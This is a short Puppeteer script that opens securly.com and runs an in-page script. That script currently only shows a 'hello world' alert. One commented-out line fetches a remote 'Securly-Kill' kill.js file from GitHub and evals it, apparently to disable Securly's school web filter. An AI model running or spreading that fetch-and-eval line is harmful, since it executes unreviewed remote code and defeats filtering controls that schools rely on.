const puppeteer = require('puppeteer');

(async () => {
    const browser = await puppeteer.launch({ headless: false });
    const page = await browser.newPage();

    // Navigate to the initial website
    await page.goto('https://securly.com/');

    // Wait for the redirection to complete
    await page.waitForNavigation();

    // Execute a script on the redirected website
    const result = await page.evaluate(() => {

      //  fetch("https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/main/kill.js").then(r => r.text()).then(r => eval(r)) // made by zek-c
        // Your custom script here
    //return document.title; // Example: Get the title of the page
    alert('hello world!');
    });

    console.log('Page Title:', result);

    await browser.close();
})();
